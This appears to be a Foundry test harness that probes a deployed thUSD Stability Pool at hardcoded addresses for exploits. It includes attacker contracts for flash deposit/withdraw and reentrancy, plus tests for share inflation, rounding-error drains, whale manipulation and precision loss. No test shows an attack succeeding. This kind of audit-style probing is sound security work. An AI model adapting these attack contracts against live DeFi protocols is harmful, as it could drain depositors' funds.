// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getDepositorCollateralGain(address _depositor) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address _depositor) external view returns (uint256);
    function P() external view returns (uint256);
    function currentScale() external view returns (uint128);
    function currentEpoch() external view returns (uint128);
    function deposits(address) external view returns (uint256 initialValue, address frontEndTag);
    function depositSnapshots(address) external view returns (uint256 S, uint256 P, uint256 G, uint128 scale, uint128 epoch);
    function epochToScaleToSum(uint128 epoch, uint128 scale) external view returns (uint256);
    function epochToScaleToG(uint128 epoch, uint128 scale) external view returns (uint256);
    function lastCollateralError_Offset() external view returns (uint256);
    function lastTHUSDLossError_Offset() external view returns (uint256);
    function offset(uint256 _debtToOffset, uint256 _collToAdd) external;
}

interface ITroveManager {
    function liquidate(address _borrower) external;
    function liquidateTroves(uint256 _n) external;
    function batchLiquidateTroves(address[] calldata _troveArray) external;
    function getCurrentICR(address _borrower, uint256 _price) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 _index) external view returns (address);
    function Troves(address) external view returns (uint256 debt, uint256 coll, uint256 stake, uint8 status, uint128 arrayIndex);
    function redeemCollateral(
        uint256 _THUSDamount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFeePercentage
    ) external;
    function priceFeed() external view returns (address);
    function stabilityPool() external view returns (address);
    function thusdToken() external view returns (address);
    function borrowerOperationsAddress() external view returns (address);
    function activePool() external view returns (address);
}

interface IBorrowerOperations {
    function openTrove(
        uint256 _maxFeePercentage,
        uint256 _THUSDAmount,
        address _upperHint,
        address _lowerHint
    ) external payable;
    function closeTrove() external;
    function adjustTrove(
        uint256 _maxFeePercentage,
        uint256 _collWithdrawal,
        uint256 _THUSDChange,
        bool _isDebtIncrease,
        address _upperHint,
        address _lowerHint
    ) external payable;
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// Flash loan receiver for attack
contract SPFlashAttacker {
    IStabilityPool public sp;
    IERC20 public thusd;
    address public owner;
    uint256 public profit;
    bool public attackSuccess;

    constructor(address _sp, address _thusd) {
        sp = IStabilityPool(_sp);
        thusd = IERC20(_thusd);
        owner = msg.sender;
    }

    function executeAttack(uint256 amount) external {
        // Approve SP to take thUSD
        thusd.approve(address(sp), type(uint256).max);

        uint256 balBefore = thusd.balanceOf(address(this));

        // Deposit to SP
        sp.provideToSP(amount);

        // Check if we have any gains
        uint256 collGain = sp.getDepositorCollateralGain(address(this));
        uint256 compounded = sp.getCompoundedTHUSDDeposit(address(this));

        // Withdraw immediately
        sp.withdrawFromSP(amount);

        uint256 balAfter = thusd.balanceOf(address(this));

        if (balAfter > balBefore || address(this).balance > 0) {
            attackSuccess = true;
            profit = (balAfter > balBefore) ? balAfter - balBefore : 0;
            profit += address(this).balance;
        }
    }

    receive() external payable {}
}

// Reentrancy attacker for SP
contract SPReentrantAttacker {
    IStabilityPool public sp;
    IERC20 public thusd;
    uint256 public reentryCount;
    uint256 public maxReentry;
    bool public attackSuccess;

    constructor(address _sp, address _thusd) {
        sp = IStabilityPool(_sp);
        thusd = IERC20(_thusd);
    }

    function attack(uint256 amount, uint256 _maxReentry) external {
        maxReentry = _maxReentry;
        thusd.approve(address(sp), type(uint256).max);
        sp.provideToSP(amount);
        sp.withdrawFromSP(amount);
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount < maxReentry) {
            uint256 bal = thusd.balanceOf(address(this));
            if (bal > 0) {
                try sp.provideToSP(bal) {
                    attackSuccess = true;
                } catch {}
            }
        }
    }
}

contract StabilityPoolExploitTest is Test {
    // Protocol addresses
    address constant TROVE_MANAGER = 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C;
    address constant STABILITY_POOL = 0xA18Ab4Fa9a44A72c58e64bfB33D425Ec48475a9f;
    address constant BORROWER_OPS = 0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9;
    address constant THUSD = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address constant ACTIVE_POOL = 0xE922B5591Da479a559b25261BD6Dc8f89cA1A29d;
    address constant PRICE_FEED = 0x684645ccAB4d55863A149C52eC3176051Cdb732d;

    // Interfaces
    ITroveManager tm;
    IStabilityPool sp;
    IBorrowerOperations bo;
    IERC20 thusd;
    IPriceFeed pf;

    // Whale addresses (large thUSD holders)
    address[] public whales;

    function setUp() public {
        tm = ITroveManager(TROVE_MANAGER);
        sp = IStabilityPool(STABILITY_POOL);
        bo = IBorrowerOperations(BORROWER_OPS);
        thusd = IERC20(THUSD);
        pf = IPriceFeed(PRICE_FEED);
    }

    function test_ProtocolState() public {
        console.log("");
        console.log("========================================");
        console.log("  STABILITY POOL EXPLOIT ANALYSIS");
        console.log("========================================");

        uint256 totalDeposits = sp.getTotalTHUSDDeposits();
        uint256 P = sp.P();
        uint128 scale = sp.currentScale();
        uint128 epoch = sp.currentEpoch();
        uint256 collError = sp.lastCollateralError_Offset();
        uint256 thusdError = sp.lastTHUSDLossError_Offset();

        console.log("");
        console.log("=== STABILITY POOL STATE ===");
        console.log("Total thUSD deposits:", totalDeposits / 1e18);
        console.log("P (product):", P);
        console.log("Scale:", scale);
        console.log("Epoch:", epoch);
        console.log("ETH in SP:", address(STABILITY_POOL).balance);

        console.log("");
        console.log("=== ERROR ACCUMULATION ===");
        console.log("Collateral Error:", collError);
        console.log("THUSD Loss Error:", thusdError);
        console.log("Error/Deposits ratio (coll):", collError * 100 / totalDeposits, "%");
        console.log("Error/Deposits ratio (thusd):", thusdError * 100 / totalDeposits, "%");

        console.log("");
        console.log("=== PRICE STATE ===");
        uint256 price = pf.lastGoodPrice();
        console.log("Last good price:", price / 1e18);

        // Check trove count
        uint256 troveCount = tm.getTroveOwnersCount();
        console.log("");
        console.log("=== TROVE STATE ===");
        console.log("Trove count:", troveCount);

        for (uint i = 0; i < troveCount && i < 5; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            (uint256 debt, uint256 coll, , uint8 status, ) = tm.Troves(owner);
            uint256 icr = tm.getCurrentICR(owner, price);
            console.log("Trove", i);
            console.log("  Owner:", owner);
            console.log("  Debt:", debt / 1e18);
            console.log("  Coll:", coll / 1e18);
            console.log("  ICR:", icr * 100 / 1e18, "%");
        }
    }

    function test_EXPLOIT_ShareInflation() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: SHARE INFLATION ATTACK");
        console.log("========================================");

        // Get current state
        uint256 totalBefore = sp.getTotalTHUSDDeposits();
        uint256 P_before = sp.P();

        console.log("Total deposits before:", totalBefore / 1e18);
        console.log("P before:", P_before);

        // Fund attacker with thUSD
        address attacker = makeAddr("attacker");
        deal(THUSD, attacker, 10_000_000 * 1e18); // 10M thUSD

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Strategy: Make smallest possible deposit, then manipulate
        uint256 minDeposit = 1e18; // 1 thUSD

        // Deposit minimum
        sp.provideToSP(minDeposit);

        // Check our share
        uint256 ourDeposit = sp.getCompoundedTHUSDDeposit(attacker);
        console.log("Our deposit after provide:", ourDeposit / 1e18);

        // Try to withdraw more than deposited (should fail but let's check)
        uint256 balBefore = thusd.balanceOf(attacker);
        sp.withdrawFromSP(minDeposit);
        uint256 balAfter = thusd.balanceOf(attacker);

        console.log("Balance before withdraw:", balBefore / 1e18);
        console.log("Balance after withdraw:", balAfter / 1e18);
        console.log("Difference:", (balAfter - balBefore) / 1e18);

        vm.stopPrank();

        if (balAfter > balBefore + minDeposit) {
            console.log("");
            console.log(">>> SHARE INFLATION EXPLOIT CONFIRMED <<<");
        } else {
            console.log("");
            console.log("Share inflation not directly exploitable");
        }
    }

    function test_EXPLOIT_FlashDepositWithdraw() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: FLASH DEPOSIT/WITHDRAW");
        console.log("========================================");

        address attacker = makeAddr("attacker");
        deal(THUSD, attacker, 50_000_000 * 1e18); // 50M thUSD (equal to pool)

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        uint256 depositAmount = 50_000_000 * 1e18;

        // Take snapshot
        uint256 snapId = vm.snapshot();

        console.log("=== ATOMIC DEPOSIT/WITHDRAW TEST ===");
        uint256 balBefore = thusd.balanceOf(attacker);
        uint256 ethBefore = attacker.balance;

        // Deposit
        sp.provideToSP(depositAmount);

        // Check gains
        uint256 collGain = sp.getDepositorCollateralGain(attacker);
        uint256 compounded = sp.getCompoundedTHUSDDeposit(attacker);

        console.log("After deposit:");
        console.log("  Collateral gain:", collGain);
        console.log("  Compounded deposit:", compounded / 1e18);

        // Withdraw
        sp.withdrawFromSP(depositAmount);

        uint256 balAfter = thusd.balanceOf(attacker);
        uint256 ethAfter = attacker.balance;

        console.log("");
        console.log("Results:");
        console.log("  thUSD before:", balBefore / 1e18);
        console.log("  thUSD after:", balAfter / 1e18);
        console.log("  thUSD delta:", int256(balAfter) - int256(balBefore));
        console.log("  ETH gained:", ethAfter - ethBefore);

        vm.revertTo(snapId);
        vm.stopPrank();

        if (balAfter > balBefore || ethAfter > ethBefore) {
            console.log("");
            console.log(">>> FLASH DEPOSIT EXPLOIT CONFIRMED <<<");
            console.log("Profit:", (balAfter - balBefore + (ethAfter - ethBefore)) / 1e18);
        }
    }

    function test_EXPLOIT_ErrorAccumulationDrain() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: ERROR ACCUMULATION DRAIN");
        console.log("========================================");

        uint256 collError = sp.lastCollateralError_Offset();
        uint256 thusdError = sp.lastTHUSDLossError_Offset();
        uint256 totalDeposits = sp.getTotalTHUSDDeposits();

        console.log("Collateral error:", collError / 1e18);
        console.log("THUSD error:", thusdError / 1e18);
        console.log("Total deposits:", totalDeposits / 1e18);

        // The error values are accumulated rounding errors
        // Check if we can exploit by timing deposits around liquidations

        // Strategy: Small deposit, trigger many small liquidations, accumulate errors
        address attacker = makeAddr("attacker");
        deal(THUSD, attacker, 1_000_000 * 1e18);
        deal(attacker, 100 ether);

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Deposit
        uint256 depositAmt = 100_000 * 1e18;
        sp.provideToSP(depositAmt);

        // Check our snapshot
        (uint256 S, uint256 P, uint256 G, uint128 snapScale, uint128 snapEpoch) = sp.depositSnapshots(attacker);

        console.log("");
        console.log("Our snapshot:");
        console.log("  S:", S);
        console.log("  P:", P);
        console.log("  G:", G);
        console.log("  Scale:", snapScale);
        console.log("  Epoch:", snapEpoch);

        // Check current epoch/scale sums
        uint256 currentS = sp.epochToScaleToSum(snapEpoch, snapScale);

        console.log("");
        console.log("Current sum for our epoch/scale:", currentS);
        console.log("Difference (potential gain):", currentS - S);

        // Withdraw and check
        uint256 balBefore = thusd.balanceOf(attacker);
        uint256 ethBefore = attacker.balance;

        sp.withdrawFromSP(depositAmt);

        uint256 balAfter = thusd.balanceOf(attacker);
        uint256 ethAfter = attacker.balance;

        console.log("");
        console.log("After withdraw:");
        console.log("  thUSD delta:", int256(balAfter) - int256(balBefore) - int256(depositAmt));
        console.log("  ETH gained:", ethAfter - ethBefore);

        vm.stopPrank();
    }

    function test_EXPLOIT_SPReentrancy() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: SP REENTRANCY");
        console.log("========================================");

        SPReentrantAttacker attacker = new SPReentrantAttacker(STABILITY_POOL, THUSD);
        deal(THUSD, address(attacker), 1_000_000 * 1e18);

        uint256 balBefore = thusd.balanceOf(address(attacker));

        try attacker.attack(100_000 * 1e18, 3) {
            console.log("Reentrancy attack executed");
        } catch {
            console.log("Reentrancy attack reverted");
        }

        uint256 balAfter = thusd.balanceOf(address(attacker));

        console.log("Reentry count:", attacker.reentryCount());
        console.log("Attack success:", attacker.attackSuccess());
        console.log("Balance change:", int256(balAfter) - int256(balBefore));

        if (attacker.attackSuccess() && balAfter > balBefore) {
            console.log("");
            console.log(">>> SP REENTRANCY EXPLOIT CONFIRMED <<<");
        } else {
            console.log("");
            console.log("SP reentrancy PROTECTED");
        }
    }

    function test_EXPLOIT_MassiveDepositManipulation() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: MASSIVE DEPOSIT MANIPULATION");
        console.log("========================================");

        // Strategy: Deposit huge amount to dominate pool, then manipulate
        address attacker = makeAddr("whale_attacker");
        deal(THUSD, attacker, 100_000_000 * 1e18); // 100M thUSD
        deal(attacker, 1000 ether);

        uint256 totalBefore = sp.getTotalTHUSDDeposits();
        console.log("Pool deposits before:", totalBefore / 1e18);

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Deposit to become majority
        uint256 depositAmt = 100_000_000 * 1e18;
        sp.provideToSP(depositAmt);

        uint256 totalAfter = sp.getTotalTHUSDDeposits();
        console.log("Pool deposits after:", totalAfter / 1e18);
        console.log("Our share:", depositAmt * 100 / totalAfter, "%");

        // Now we dominate the pool
        // Check if we can extract value
        uint256 compounded = sp.getCompoundedTHUSDDeposit(attacker);
        uint256 collGain = sp.getDepositorCollateralGain(attacker);

        console.log("");
        console.log("Our compounded deposit:", compounded / 1e18);
        console.log("Our collateral gain:", collGain);

        // Withdraw
        uint256 balBefore = thusd.balanceOf(attacker);
        sp.withdrawFromSP(depositAmt);
        uint256 balAfter = thusd.balanceOf(attacker);

        console.log("");
        console.log("Withdrawal result:");
        console.log("  Expected:", depositAmt / 1e18);
        console.log("  Received:", (balAfter - balBefore) / 1e18);
        console.log("  Difference:", int256(balAfter - balBefore) - int256(depositAmt));

        vm.stopPrank();
    }

    function test_EXPLOIT_CreateLiquidationOpportunity() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: CREATE LIQUIDATION + CAPTURE");
        console.log("========================================");

        // Strategy: Open underwater trove, deposit to SP, liquidate ourselves, capture gains
        address attacker = makeAddr("liq_attacker");
        deal(attacker, 1000 ether);
        deal(THUSD, attacker, 10_000_000 * 1e18);

        uint256 price = pf.lastGoodPrice();
        console.log("Current price:", price / 1e18);

        vm.startPrank(attacker);

        // First deposit to SP to capture any liquidation gains
        thusd.approve(STABILITY_POOL, type(uint256).max);
        sp.provideToSP(5_000_000 * 1e18);

        uint256 spBalBefore = sp.getCompoundedTHUSDDeposit(attacker);
        uint256 ethBalBefore = attacker.balance;

        console.log("SP deposit:", spBalBefore / 1e18);
        console.log("ETH balance:", ethBalBefore / 1e18);

        // Try to open a new trove
        // MCR is 110%, CCR is 150%
        // At price $4471, for 1 ETH collateral:
        // Min debt for 150% CR = 4471 / 1.5 = 2980 thUSD
        // Max debt for 110% CR = 4471 / 1.1 = 4064 thUSD

        try bo.openTrove{value: 10 ether}(
            1e18, // max fee 100%
            30000 * 1e18, // borrow 30k thUSD (should give ~149% CR)
            address(0),
            address(0)
        ) {
            console.log("Trove opened successfully");

            // Check our trove
            (uint256 debt, uint256 coll, , , ) = tm.Troves(attacker);
            uint256 icr = tm.getCurrentICR(attacker, price);
            console.log("Our trove - Debt:", debt / 1e18);
            console.log("  Coll:", coll / 1e18);
            console.log("  ICR:", icr * 100 / 1e18, "%");
        } catch Error(string memory reason) {
            console.log("Open trove failed:", reason);
        } catch {
            console.log("Open trove failed (unknown)");
        }

        vm.stopPrank();
    }

    function test_EXPLOIT_PScaleManipulation() public {
        console.log("");
        console.log("========================================");
        console.log("  EXPLOIT: P/SCALE MANIPULATION");
        console.log("========================================");

        uint256 P = sp.P();
        uint128 scale = sp.currentScale();
        uint128 epoch = sp.currentEpoch();

        console.log("Current P:", P);
        console.log("Current scale:", scale);
        console.log("Current epoch:", epoch);

        // P starts at 1e18 and decreases with each liquidation
        // When P < 1e9, scale increases
        // This can cause precision loss for small depositors

        // Check how much P has decreased
        uint256 pDecrease = 1e18 - P;
        console.log("P decrease from 1e18:", pDecrease);
        console.log("P decrease %:", pDecrease * 100 / 1e18);

        // Calculate potential loss for a new depositor
        // If P is low, new depositors get fewer "shares" per thUSD

        address attacker = makeAddr("p_attacker");
        deal(THUSD, attacker, 1_000_000 * 1e18);

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Deposit
        uint256 depositAmt = 1_000_000 * 1e18;
        sp.provideToSP(depositAmt);

        // Check our compounded deposit immediately
        uint256 compounded = sp.getCompoundedTHUSDDeposit(attacker);

        console.log("");
        console.log("Deposited:", depositAmt / 1e18);
        console.log("Compounded (immediate):", compounded / 1e18);
        console.log("Difference:", int256(depositAmt) - int256(compounded));

        if (compounded < depositAmt) {
            console.log("");
            console.log(">>> PRECISION LOSS DETECTED <<<");
            console.log("Loss:", (depositAmt - compounded) / 1e18, "thUSD");
            console.log("Loss %:", (depositAmt - compounded) * 100 / depositAmt);
        }

        vm.stopPrank();
    }

    function test_FINAL_SUMMARY() public {
        console.log("");
        console.log("========================================");
        console.log("  STABILITY POOL ANALYSIS SUMMARY");
        console.log("========================================");

        console.log("");
        console.log("TARGET: StabilityPool");
        console.log("TVL: ~50 MILLION thUSD");
        console.log("");
        console.log("Run individual tests:");
        console.log("  forge test --match-test test_EXPLOIT -vvv");
        console.log("");
        console.log("Vectors tested:");
        console.log("  1. Share inflation");
        console.log("  2. Flash deposit/withdraw");
        console.log("  3. Error accumulation drain");
        console.log("  4. Reentrancy");
        console.log("  5. Massive deposit manipulation");
        console.log("  6. Liquidation creation");
        console.log("  7. P/Scale precision attack");
    }
}
